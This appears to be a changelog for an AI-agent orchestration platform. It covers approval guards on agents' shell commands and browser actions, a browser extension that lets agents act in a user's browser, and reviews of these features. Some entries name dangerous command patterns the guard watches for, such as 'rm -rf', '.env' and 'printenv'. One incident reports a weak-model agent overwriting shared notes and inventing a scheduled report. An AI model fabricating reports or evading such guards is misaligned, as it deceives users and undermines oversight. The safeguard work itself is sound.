An agent wrote its deliverable as a message in the middle of the run and ended with a short «ready, see above». The run's text messages (`assistant` events) were streamed live but, outside debug mode, NOT stored — only the final result was. After a reload (or in a chat / the task page opened later) the person saw only «ready, see above». Now an agent's text messages are stored like the final answer (tool calls, thinking and system lines still only in debug mode), and SOUL.md says the final message must carry the deliverable itself, never «see above». Existing tasks lost those messages for good.

## «Document ready» with no content — the charter itself asked for it (fixed)
After 0.1.102 an agent still ended with «the document is ready» and the list lived only in a saved file. Cause: SOUL.md told agents to «refer to a file, do not repeat it» and `workspace_save` «lists it as an attachment — no copy», which the agent applied to the very document the person asked to read; and the dashboard could not open such a file in the page (Markdown / html were only downloads). Now: SOUL.md says a document the person asked for is answered IN the final message (up to ~6,000 characters; longer — every item in brief plus the file name), the «refer, do not repeat» rule is limited to pictures / videos / files already shown; and attachments of type md / html / csv / json / txt / pdf open in a viewer in the page (`DocViewer`: Markdown rendered, html sandboxed without scripts, csv as a table). A document saved with `workspace_save` is also posted into the conversation as a chip that opens the viewer (before, only pictures were). Not a code guarantee for the content — the agent can still disobey; if it recurs, the next step is to attach the file's text to the final message automatically.

## The answer stayed in an earlier message, the last one said «answered above» (fixed in code, not only in the prompt)
Seen on a PM agent: the letter and the list of services were written as a message, then the run ended with «Ответил выше. Изменений в коде нет.» — and a chat channel / the «messages only» view shows the last message. The agent then re-sent the same list three times (money wasted). The charter rule alone did not hold (the model breaks it). Now the server enforces it: when the final message is short (< 240 characters) and the run's last long message (≥ 400 characters, no real work after it — only reporting / saving / showing tools) is not in it, that message is put in front of the closing line; the dashboard hides the earlier copy so the text is not shown twice. Also noted, not changed: the closing «no code changes» on a question that has nothing to do with code is the agent's habit (a shipped template can be tuned; the user's own `pm.md` was not touched).

## Cards in No-approvals mode for `$LDS_ATTACHMENTS_DIR/…` and `rm -rf` of it (fixed)
A scheduled agent (chart → PNG → send → clean up) got a card on 11 of its runs although the project asks nothing: the shell guard treats a path it cannot know (`$VAR/…`) as «outside the working directory», and the task's attachments folder was not one of the agent's write roots at all. `/tmp` itself was already free (SCRATCH_ROOTS). Now: the task's attachments folder is a write root; `$LDS_ATTACHMENTS_DIR` and `$TMPDIR` (values passed by the hook / read from the agent's environment, only those two, only plain absolute paths) are substituted before the command is judged, so `cp x $LDS_ATTACHMENTS_DIR/`, `rm -rf $LDS_ATTACHMENTS_DIR/old`, `mkdir $TMPDIR/b` are routine and `$LDS_ATTACHMENTS_DIR/../../..` or an unknown `$HOME/x` are still asked about. Other variables (`$D` from `mktemp -d`) remain «unknown» → a card; use a literal `/tmp/name` path in such scripts.

## UX: a new agent message appears smoothly, word by word (changed)
New messages used to appear all at once, which is hard to follow. A message that arrives while the chat is open is now revealed by words: ~30 words/s, a long message speeds up so none takes over 3 s; the first word shows at once; the chat keeps following the bottom unless the person scrolled up; a click shows the rest; not for short messages (< 40 characters), history loaded on opening, a hidden tab or the «reduce motion» system setting; a message already shown does not replay when the view is re-rendered, and a final answer that begins with a text already read continues after it instead of replaying. Sound, read-aloud and copy use the full text.

## Approvals went to Telegram at once although the dashboard was open (fixed)
«Dashboard first» (10 s to answer on the page, then the chats) counted a dashboard as being in front of someone only while its WINDOW HAD THE KEYBOARD FOCUS. Clicking into another window or app — even with the dashboard visible beside it — made the server see «nobody looking» and send the request to Telegram at once. Now the dashboard reports whether its TAB IS VISIBLE (hidden / minimised / switched away on a phone = not in front), so a visible page always gets the 10 seconds. Still immediate by design: a task started from a chat goes back to that chat; with no dashboard tab visible at all the request goes to the chats at once.

## The 🌐 translate button had no language setting (added)
It translated into the browser's language and nothing else. Settings → General → Translation now lets this browser choose the target language (default: the browser's language).

## VoiceLab (voicelab.uz) as a speech provider (added)
Voice worked only with OpenAI-style audio APIs. A provider of kind OpenAI whose Base URL is on voicelab.uz now switches to VoiceLab's own API: TTS `POST /v1/tts` (WAV → Opus / MP3 through ffmpeg, the WAV when there is no ffmpeg), STT `POST /v1/stt` with an idempotency key + polling `/v1/stt/transcriptions/{id}`, the voice catalog `GET /v1/voices` (Settings → Voice → Load voices). Settings: language of the text + voice id instead of a model. Written from the public documentation and tested against faked responses only — **not yet run against the real service**. A second pass against the API pages fixed three mistakes before any release: the STT upload field is `audio` (not `file`), the TTS body uses `voice_id` (not `voiceId`), and transcript segment times are in milliseconds (`start_ms`). Still unconfirmed: the shape of `GET /v1/voices` and of a finished TTS job (read leniently) — confirm with a real key and the Test button. Auth is sent as `Authorization: Bearer <key>` — if VoiceLab wants another header, that is one line in `voicelab.ts`/`audioEndpoint`.

## Local voice add-on: free speech on the server, Russian + English (added)
`sudo aigentron addon enable voice` installs Piper (voices ru_RU-irina-medium, en_US-amy-medium; the voice `auto` picks Russian or English by the script of the text) and faster-whisper (default model `small`, `--stt-model`, `--no-stt`) behind an OpenAI-compatible address `http://127.0.0.1:8880/v1`, as a hardened systemd unit; Settings → Voice has a one-click «Use it for recognition and speech» (creates the provider `local-voice`). Kokoro was rejected: it has no Russian. Downloads are sha256-pinned. Verified end to end in a clean `debian:12` (arm64) container: install → Russian and English speech (wav / mp3 / opus) → recognition of both back to the right text, with segment and word times. That run found one real installer bug (faster-whisper needs `requests`, not pulled by pip) — fixed. Also verified as the unprivileged service user with the model offline: recognition of ogg/opus, webm, m4a, automatic language, two recordings at once (serialised by a lock). Not verified: the systemd unit itself and Ubuntu 24.04 / Amazon Linux / x86_64 (same code paths; the Piper x86_64 tarball hash is pinned but was not run). Bare-metal only; on a Docker install point a provider at any OpenAI-compatible speech container.

## Browser extension, stage E0 (added)
The Chromium extension is built per server: `GET /api/extension/download` rewrites the shipped template (`extension/`) with this server's addresses (host permissions and page-bridge matches only these), its name and a per-server key (stable extension ID), and streams a zip with no secret in it. Connect = a handshake with the signed-in dashboard page (a 60-second one-use code → the extension's own token, a session marked `x`, 90 days, listed and revocable in Sessions; the guard narrows it to a short allow-list of routes). Needs a sign-in password. Verified in a real Chrome for Testing: the generated package loads, the handshake completes, the popup reads the projects. Not built yet: capture (E1), approvals on the page (E2), side panel / bug report / voice (E3), agent control (E4). Known limits: an unpacked extension is updated by hand (the dashboard shows the versions); the token is not refreshed — 90 days, then Reconnect.

## Browser extension is built with the project; the server only configures it (changed)
First cut shipped the extension's sources as a folder the server zipped. Now `apps/extension` is a workspace package: `build.mjs` validates the sources (manifest, referenced files, JS syntax, no `<all_urls>`) and writes the template to `dist/` as part of the project build (`install.sh`, `minimal.Dockerfile`, the dev entrypoint). The server never builds anything: a download copies `dist/` and writes only `manifest.json` (addresses, name, key, version) and `config.json`. The extension has its own tab in Add-ons (next to Browser, Playwright and the new Voice tab), no longer a card in Settings.

## Browser extension: its own identifier (not a sign-in session) and stage E1 (changed / added)
E0 issued the extension a signed session and so needed a sign-in password — pointless on a local run. Now the extension has **its own device credential** (`ext_<id>_<secret>`, hash only in `secrets/extension-devices.json`, 180 days idle): the Connect handshake with the open dashboard page creates it; with a password set only a signed-in person can press Connect and the extension acts as them, without one it is bound to the server's address alone and acts as the default operator. It is no longer a session (a password change does not end it; the dashboard's *Connected browsers* list does). The guard checks it before the sign-in check and narrows it to a short allow-list.
E1: «Send to Aigentron» — the toolbar popup, the right-click menu and Alt+Shift+A capture the page (title, the readable text of `<article>` / `<main>`, the selection, a screenshot), a compose tab lets the person tick what to send, mark the screenshot, pick the project (remembered per site), the agent (the project's pinned / default) or a knowledge base (the project's and the global ones), and `POST /api/extension/clip` does it in one call (text of the page goes to the agent as marked DATA; a screenshot is a flattened JPEG ≤ ~1.7 MB; a task needs task_setter+, a note operator+). Verified in a real Chromium (capture, pickers, send, screenshot with a drawn mark) and against the real local server (pairing without a password, device token, allow-list, one-use code). Not verified by hand: the toolbar click / menu / shortcut themselves (they need a gesture; the same code path is exercised through the compose deep link), `captureVisibleTab` (needs the gesture).

## Audit of the administrator's knowledge (2026-11-02): stale or misplaced entries fixed
Checked agent/skills/core/admin/*.md and agent/builtin/admin.md against the code and the interface: every admin tool and its argument names match `internal-tools.ts` (an ad-hoc comparison; only enum values differ by notation). Fixed: the Add-ons page now has four tabs (Browser, Playwright, **Voice**, **Extension**) — described; the browser extension text had landed inside the Discussion section (moved to Add-ons) and the **Translation** card was missing from Settings → General; branches are `agent/<short-title>-<id6>` (the docs still said `agent/task-*` in maintenance, cleanup and the approvals note); `propose_task` no longer asks in No-approvals mode; **where a card goes** (dashboard first, 10 s, then the project's / free chats; a chat task answers in its chat) was undocumented; agent **Export / Import**, the word-by-word message reveal, stored agent messages and the 📄 document chip were missing; the admin's own prompt now names voice / add-ons / the extension among what the person sets up. `admin-tools.md` sits ~40 characters under the 16,000 cap — the next addition needs a cut elsewhere.

## Browser extension, stage E2: approvals and questions on the current page (added)
The extension keeps a Socket.IO connection (device token in the connect packet; the gateway accepts it), holds the pending approvals / questions, and draws a card on the page the person is looking at (an optional «any page» permission, a closed shadow root, trusted clicks only after 0.4 s), else a notification with Approve / Deny and a badge. `approvalNeedsDashboard` (shared) marks what only the dashboard may decide — merge, main / master, outside the folder, credentials, `propose_*`, secret requests; the card offers «Open in the dashboard» and the server refuses such a decision from an extension token. The extension reports presence (window focused + not idle) so «dashboard first» works with only the extension open. **The sound is not played while a dashboard tab is open** (it plays its own). Verified in a real Chromium against a fake Socket.IO server; not verified by hand: the popup permission button (needs a click), notification buttons, the offscreen sound itself.

## Browser extension, stage E3 and in-place updates (added)
E3: a **side panel** (tasks with live updates, a conversation with an agent, a new chat with the current page), **Report a bug** (a per-tab recorder of console errors, uncaught errors and failed requests, an element picker, a screenshot and the environment; query strings dropped and tokens redacted in the page and again on the server; the task carries it as labelled data), **dictation** (a 🎤 button; the recording goes to the server's speech recognition). The side panel cannot show the browser's microphone question, so a one-time page asks for it.
**Updates**: a developer-mode extension is not updated by the browser, so the extension checks the version the server ships, tells the person (popup, panel, dashboard banner / card) and can update itself **in place**: the person points at the extension's folder once (File System Access API), the extension downloads `GET /api/extension/package`, verifies the archive (CRC-32 of every file), refuses a package that is not newer, has another key or asks for more permissions / addresses, writes the files (manifest last), removes stale ones and reloads — the ID, and so the connection, is unchanged. The manual way (download, unzip over the folder, *Reload*) stays. Verified: the zip reader, the compatibility rules and the writer (on an in-memory folder) by unit tests; the notice and the update page in a real Chromium. Not verified: the native folder picker and writing into a real folder (they need a person).

## Browser extension, stage E4a: agents in the person's browser — read, navigate, search (added)
New MCP server `browser-ext` (`/api/browser-mcp`, loopback + a bearer per run) and the line to the extension (`ext:command` / `ext:result` / `ext:stop` / `ext:allow` over the existing Socket.IO connection). Agents get: tabs, open, navigate, search (DuckDuckGo by default, `BROWSER_SEARCH_ENGINE`), snapshot (a text outline; no field values, no passwords), read (paged text), screenshot, close — in a separate «Aigentron» window; a frame with a Stop button in every tab an agent works in. Safety, in both server and browser: a card per site and task (even in No-approvals mode; «always» is a standing exception), a never-allowed list (banks / payments / password managers / mail & identity / cloud consoles / `bank` and `paypal` hosts / metadata addresses / **the Aigentron server itself**), local-network addresses only with a card that says so, redirects to another site ask again, everything read is labelled untrusted data, one task per browser at a time, Stop cuts a task off for ten minutes. **Not yet**: clicking, typing, forms (E4b) — the skill tells agents to hand those steps to the person. Verified in a real Chromium and by unit tests; not verified with a real agent run (a task that needs the web has to run).

## Browser extension, stage E4b: agents click, type and fill forms in the person's browser (added)
`browser_click / type / select / press / scroll` on the `[eN]` references of a snapshot, with two grant levels (`read`, `interact`), the touched fields outlined, the agent paused for three seconds after the person's own click / key / wheel in the tab. Hard rules in the browser: never a password / card / one-time-code field; a submit control, a commit-worded button (pay, order, delete, send, sign in …) or Enter in a form is NOT carried out — the browser returns what the person should see (button, site, form action, the form's values with sensitive ones masked), the server asks with its own card (`browser_submit`: every time, even in No-approvals mode, never a standing exception) and only after a yes re-sends the command with `confirmed`, which only the server can set. Limits: actions are DOM events, not trusted input (some sites ignore them; the `chrome.debugger` fallback is not built); a commit word list cannot be complete — the person still sees a card for every submit control and Enter-in-form, and the site grant is per task. Verified in a real Chromium on a test form and by unit tests; not verified with a real agent run on a real site.

**Automatic**: nobody has to put `browser-ext` into each agent's `mcp:` — every agent run gets it while at least one extension is paired (not the admin, not discussion turns); a checkbox on Add-ons → Extension switches it off for everybody.

## Review of the extension and browser control by a second model (Fable) — findings and what was done (added)
Two read-only reviews (server side incl. the local voice add-on; the extension client). Every finding was checked in the code before acting.
**Fixed**
- **The server could be reached under another spelling** (`localhost.`, `127.0.0.1`, `[::1]`, `0.0.0.0`, IPv4-mapped IPv6, another port of the same machine): the never-allowed check compared an origin string. Now hosts are canonical (`canonHost`), the Aigentron server is recognised by name or by *this machine on a port the server uses*, mapped-IPv6 metadata addresses are caught; the extension's `policy.js` is the same code.
- **Look-alike domains** (`xn--pypal-4ve.com`, Cyrillic letters): hosts are decoded from punycode and compared by a Latin "skeleton" against the never-allowed list.
- **A grant was per host name, not per port** (`localhost:5173` also opened `localhost:11434`): grants are now `host[:port]`; the extension returns the full address with `needsGrant`.
- **Links and forms that leave the site** were judged only after the page had loaded: a click on a link / a submit to another origin is now checked against the rules and grants BEFORE it is pressed. Enter in a text box / textarea / contenteditable (a chat that sends on Enter) now needs the person's yes; the list of "commit" words is much longer (save, add, share, continue, … and Russian ones).
- **The in-place update could delete the person's files** (it removed everything in the picked folder that the new package lacked) and trusted zip names: only extension-type files in folders the package fills are removed; names with `..`, `/`, `\`, empty parts are refused.
- **Blind approval of browser cards** (`/approve` in Telegram, `approve_task` over MCP) and the "needs the dashboard" test for cards the extension may answer: browser grant / submit cards are never approved blindly; the dashboard-only test now also uses the danger classifier (hard / guard).
- A task nobody owns no longer picks "any" paired browser when several people have one; `ext:allow` is honoured only from an attached extension socket.
- Extension: the **Stop** now lives in session storage (survives the service worker being unloaded); notification buttons wait for the inbox to load; the popup explains `<all_urls>` honestly (draws cards only; agents never get it).
- VoiceLab: the API key is not sent to another origin that a job points at; local voice add-on: a negative `Content-Length` is refused.
- E2E: the test waits no longer fail on a page that is still loading; the pages agents visit are served from a second port (the connected server itself is off limits).
**Left as is / to do later**: per-device Stop on the server side, clip-prompt delimiter hardening, element-picker sanitised clone, sio ping watchdog, `captureVisibleTab` target window, trusted-proxy key for the rate limiter, `--only-binary` pins in `bare.sh`, run-end bearer disposal. **Documented only**: a device token survives a password change (revoke it in Settings → Extension); pairing relies on localhost CORS; `ps` shows the add-on's argv.

## Text compression and filtering (added)
Configurable model-free filters for what goes to an agent (messages, bulky tool answers), Settings → Work → Compression, savings per rule and project on Stats; the Stats "By project" view got a chart like the provider one. Not yet covered: `browser-ext` snapshots and third-party MCP answers. Estimate on Stats is ≈ chars/4 tokens.

## Review of the compression filters by a second model (Fable) — what was fixed (added)
Verified in code and fixed: the transcript showed the COMPRESSED message (now the original; the model gets the short one, the orchestrator's reference context is never filtered); the `quotes` rule ate Markdown quotes, SQL `--` comments and patch headers and could cut the `read_document` continuation note (now messages only, needs a run of 4+ quoted lines or a `wrote:` header, a signature only as `-- ` near the end); `truncateLogs` cut video transcripts (`[m:ss]`) and dropped an ERROR in the middle of a log (transcript lines excluded; lines that report a problem are kept); whitespace/repeat folding damaged code, tables, diffs (code fences untouched, no inner-space collapsing, tool answers skip repeats); a lossy result that grew was kept (now any filter that does not shorten the text is discarded); a catastrophic custom regex could freeze the server (nested-quantifier patterns are refused, custom rules do not run on texts over 60 000 characters, quadratic built-in regexes replaced); duplicate flags / rule names are normalised. Left as is: custom rules still run synchronously on the event loop (guarded by the pattern check, not a worker/RE2); failover attempts each record their own savings; chat-inlined attachment text is not filtered; `blobs` may shorten a 400+ character token (JWT) read from a file.

## Dashboard: "normalizeCompression is not a function" (added)
Vite's pre-bundled copy of the workspace package `@lds/shared` (apps/dashboard/node_modules/.vite) predated the new compression exports, so the Settings page failed at runtime. Fixed by clearing the cache; `infra/dashboard-entrypoint.sh` now removes it on every start so a new export in shared can never be missing.

## Escalation ladder and model cost ranking (added)
Agents can list `escalation: provider/model, …`; a run that could not finish continues on the next, stronger step, and fallbackProviders are used only when no step is available. Model lists carry `info` (tier, price per million tokens from LiteLLM's public price map, local = free, otherwise guessed from the name). Not covered yet: escalation on a failed verification gate, escalation statistics, manual price override.

## Escalation: the hand-over note did not reach the model (fixed) and the gate uses the ladder (added)
The note written on a quality escalation (what the earlier attempt said) was only shown in the transcript; the stronger model started a fresh session without it. It is now passed to the model (`handoff`, not shown as the person's message). A red verification gate now climbs the agent's escalation ladder: first fix on the agent's own model, later ones on steps 1, 2, … in a fresh session carrying the task's original request. Known limit: after a run that was itself escalated, the first gate fix still goes to the primary model.

## Question mode (added)
Tasks of kind `ask` use the light chat lifecycle (no worktree, gate or status contract), the reserved queue lane and the question model from Settings → Work → Questions. Not yet: ask-by-default in Telegram, promoting a question to a task, a reduced tool set for questions.

## Add-ons → Extension: versions and the update banner (added)
The extension now reports its version (`x-extension-version` header and the socket's connect packet); the server keeps it per paired browser. The Extension tab shows the version on the server, in this browser and per connected browser with "update available" / "up to date", a banner when any is older, and the Add-ons tab carries a ⚠ while an update is pending. A browser on an older build that does not report shows "version unknown".

## Review of the escalation ladder and question mode by a second model (Fable) — fixed
- **A question ran a WORKING agent with its full tools in the agent-configuration folder** (a write boundary that holds the agents' logins). Now a question is read-only (no Bash / Write / Edit / Task / Agent; web search stays), runs in the task's project folder (or an empty scratch folder), and has its own orientation text. A chat agent (the admin) keeps its place and limits.
- A failover after an escalation dropped the hand-over note (the next provider started a fresh session without knowing what was done): the note now stays.
- A follow-up after an escalation resumed the session on the agent's PRIMARY (cheaper) model: it now resumes on the provider and model whose session it continues.
- A fresh session started by an escalation lost the references added before the last run; a question's prompt carried the resource index; the question-model provider being gone was silent (now logged); price-map downloads were not shared between simultaneous lists; the ladder editor showed a missing provider as the first one and saved incomplete steps (now flagged / blocked); the ladder hint now says an error on the own model goes straight to the first step.
- Left as is: a cooling primary is not moved behind a ladder (its order is the point); no test of the executor loop itself (escalation → failover → hand-over) — covered by the pure parts only.

## Stats: escalations and questions (added)
Escalated runs record why and from which provider/model (`escalationReason`, `escalatedFrom`); Stats shows them by reason and path, and the cost of light-mode questions, per project filter.

## Channel setting: what a plain message starts (added)
Per-channel `defaultMode` (task | ask). Not done: automatic sliding/compaction of a question dialog (a long chat of questions keeps growing until /clear).

## Duplicated message after «↻ run ended without report_task_status — resuming once» (fixed)
The long answer an agent wrote as a message is put in front of the closing line of the FINAL result (`finalWithAnswer`). It was remembered for the whole run attempt, so the short result of the reporting-resume turn that follows carried the same long answer a second time: the answer appeared twice, once before and once after the ↻ note. The answer is now consumed by the first final result (`AnswerTracker`, tested incl. the resume case).

## The administrator's reference as a knowledge base (added)
Platform-kept base `admin-reference` (seeded and synchronised from the shipped guides at every start; read-only; admin only); the admin prompt keeps a table of contents instead of the full guides. Falls back to inlined guides when the base is not ready. Savings and answer quality not yet measured on a live model.

## Review of the administrator reference (Fable) and the 5-question run — fixed
- **The first design cost MORE tokens on a provider without cache** (admin searched itself: 3–5 turns, 48–95k input per question vs ~33k before) and a card was cut at 700 characters in search hits (a wrong answer). The server now picks the best passages for the message and attaches them whole to it (1 turn, ≈23.7k input), the base is cut into small passages (cards / recipes), and hits of this base are not truncated. Retrieval test made strict (the needed fact must be inside the first 4 passages).
- **A chat (Telegram) final message could become «Status reported.»**: the AnswerTracker fix made the reporting-resume turn's short result the newest `result` event. The resume turn's result is now an orchestration note (`resumeTurnEvent`), never an answer; the dashboard duplicate is gone at the root.
- The reference was built from the previous release's guides right after an update (start-up order): it now reads the release's own copy first. An embedding model may be set on the system base (nothing else may be changed). One section that cannot be indexed no longer stops the sync (and the lead-in-only parts are not made).
- Left as is: two sections with identical text collapse into one; a failed sync is only a warning (the admin then falls back to the inlined guides when the base is empty).

## gitleaks: a fake token in the extension e2e test (fixed)
The redaction check of the extension's bug report used a made-up `token=…` value (a 22-character letters-and-digits string) that the secret scanner took for a key. The fake credentials are now assembled from pieces in the test; the old findings in history (the same test, and key-building code / fixtures of the git module) are listed in `.gitleaksignore`. `gitleaks detect` over the history reports no leaks; a scan of the working tree also sees the git-ignored local files `.env` and `.claude/settings.local.json` (not in the repository).

## Approval for a heredoc that only writes a document (fixed)
The text rules of the approval classifier (rm -rf, git push, curl -X, --force, .env, printenv …) were applied to the whole command, including the body of `cat > doc.md <<'EOF'`. A document that merely MENTIONED such words needed an approval (or a hard block for a credentials word). The body of a heredoc that only writes text (`cat` / `tee`, QUOTED delimiter, no pipe or chain on the line) is now content, not commands; unquoted delimiters, pipes into a shell, `bash` / `python` consumers and everything after the document are still read. The line that writes the file is still judged (protected targets).

## Compression rules: crowded fields (fixed)
Each custom rule is now a bordered block with aligned fields and room around the buttons.

## Escalation steps: «the last step is not removed» (not reproduced)
Checked in a real browser (add, remove first / last / only step, save): removal and saving worked in every case. Waiting for the exact steps from the report.

## Schedules: main menu + scripts (added)
Schedules moved from a Settings tab to the main menu (⏰, right after Tasks; `/schedules`). New kind **script**: a shell script run with `sh -c` in the schedule's project folder (scratch folder if none), a minimal environment (the verification gate's list, plus `LDS_SCHEDULE`), a time limit (default 10 min, max 6 h, the whole process group is killed), the tail of the output kept on the schedule (`lastOutput`) and posted to a chat after every run or only on failure (`notifyOn`); never two runs of one schedule at once. Only an operator / admin can create or change one through the dashboard / API: the admin assistant's `propose_schedule` and packs are refused (validate has no `allowScript`). Scripts run with the orchestrator's rights — as the verification commands do — so who may create them is the safeguard.

## Script schedules: files to the chat and a data folder (added)
A script gets `LDS_OUTPUT_DIR` (empty at each start; its files are posted to the schedule's chat — photos / documents — and deleted) and `LDS_DATA_DIR` (kept between runs). Example `docs/examples/fx-chart.py` (EUR/UAH PrivatBank chart, tested with real rates); guide `docs/schedule-scripts.md`. Reason: a small model could not reliably draw and send a chart (background run, "I will report later", stalled run) — a fixed script can.

## Weak models overwrote shared notes, and a scheduled report was invented (safeguards, steps 1-3)
Incident (a user's server): a scheduled agent on the cheapest model replaced a history note with one line (388 → 57 bytes), overwrote the team's `memory/` files, and sent a report copied from the example numbers in its own prompt.
Cause found in the code: the project's shared folder (memory, library, brief) is a write root, so a Write / Edit / shell redirect / patch into it was judged benign by the hook and allowed locally, without the orchestrator ever seeing it.
- **Step 1.** Writes into `memory/`, the project's note library and the brief by hand are refused by the hook on the spot (no card; the text names the tool to use: `workspace_note`, `workspace_save`, files of its own in `work/`) — for every model (`ClassifyOptions.protectedPaths`, `LDS_PROTECTED_PATHS`, `verdict.refuse`; also on the orchestrator's `check`). Covers Write/Edit, shell redirects / tee / sed -i / mv / rm, Codex `apply_patch`. Reads stay free; `work/` and `deliverables/` are unchanged.
- **Step 2.** Library notes: the old text is kept as a version before any replacement (last five), new `propose_resource` action `append` (only new lines), a replacement that would drop most of a note is refused before a card unless `replace: true`; the answer says how many lines the note has now.
- **Step 3.** A scheduled run that used no tool gets a ⚠ line under its report; the scheduled-run hint forbids background work / "report later" and copying numbers from examples; the schedule form warns about numbers in a task prompt.
Not covered: files overwritten before this change cannot be restored. Steps 4-5 (model tier per run, stats by model) follow.

## Weak-model safeguards, steps 4-5 (added)
- **Model strength per attempt** (`tierFor`: the agent's `tier:` override, else the gateway price map / local size / name; unknown = `mid`). A `cheap` run gets a static «work carefully» note in its system block (numbers only from tools of this run, work before report, no background processes, shared notes only by adding) and `create_task` / `propose_task` are no longer waved through in the no-approvals mode (`LDS_MODEL_TIER` → hook → `approvalWaived`). Agents form: *Model strength*.
- **Stats → How runs ended, by model** (done / failed / blocked / no report per model, escalations in, average steps).
- Not built, on purpose: cards for overwrites (refused instead — a card at 03:00 is a delayed denial), forced read-back and a stricter report_task_status (a weak model fakes them), per-tier tool sets, automatic weakening from statistics. Known limit: the tier of a run is the lead's; a cheap subagent under a strong lead is not tightened.

## Agents could not use the browser: "This tab is not showing a web page" (fixed)
Reported by an agent: opening Chrome Web Store / Firefox Add-ons returned «This tab is not showing a web page», and the two open tabs had no title or address. Cause: the extension asks Chrome for access to websites (`<all_urls>`) only as an OPTIONAL permission, and the only place that asked was the «Show cards on any page» button (worded as if agents never needed it). Without it Chrome hides a tab's address and title from the extension and refuses to run in the page; the agent-browser code reported that as «no web page». (The e2e test passed because the test browser has the permission and the site was localhost.)
Fix: the extension says so plainly — «The browser has not given the Aigentron extension access to websites yet … press "Allow agents to use my browser"» — before the person is asked to approve a site; the popup shows a notice and the button in the «Agents in your browser» block with honest wording; the extension reports whether it has the access (`x-extension-access`) and Add-ons → Extension warns "agents have no access to sites" per browser. Reaches a user's browser with the next extension update.

## Add-ons still said agents had no access after the access was given (fixed)
The extension told the server about its access only with its next API call, and the Extension tab loaded the list once. Now a change of the browser's permissions is reported at once (`/api/extension/me`), and the list refreshes every 8 s while the tab is open. (Right after giving the access, reloading the page or opening the extension's popup also updates it.)

## The Chrome Web Store could not be read: «The extensions gallery cannot be scripted» (a fallback added)
Chrome forbids extensions to inject scripts into its own pages (chromewebstore.google.com, chrome.google.com/webstore, chrome://…) whatever permission is given. For those addresses (and when the browser answers with that refusal) `browser_read` / `browser_snapshot` now fetch the page SOURCE from the extension and return the title, descriptions, structured data (ld+json), snippets of embedded JSON that mention ratings / users, and the visible text of the source (`source: fetched`, with a note that it is not the live page). Click / type on such a page say it can only be read. Limit: the Web Store draws itself with scripts, so counts may be missing from the source — the agent is told to say so, not guess; for exact Chrome numbers the person reads the page or sends a screenshot.

## Pages Chrome will not script: a third stage, a screenshot (added)
After the page source (stage 2), a source that is almost empty (a page drawn by scripts: `thin`) gets a screenshot of the tab. The server reads it with the project's vision model into text ("Read from a screenshot (by a vision model)", numbers exactly as shown) — so any agent works, vision or not; without a vision model the picture itself goes to the agent. `browser_screenshot` accepts a `question` for the same on demand. Not guaranteed: Chrome may refuse to capture its own pages too (the note then says so), and a vision model can misread a number — the answer is marked as read from a picture.

## Queued messages vanished from the chat after a page refresh (fixed)
A message sent while the agent was running was shown in the conversation only from the page's local "sending…" list; after a refresh that list was empty and the message was visible only in the composer's "Queued" block (task page) or not at all (admin chat). Fix: the task page and the admin chat load the server-side queue (`/tasks/:id/pending-follow-ups`, live via `followUpQueue`) and show those messages in the conversation as queued; a local "sending…" message that is already in the queue is not shown twice.
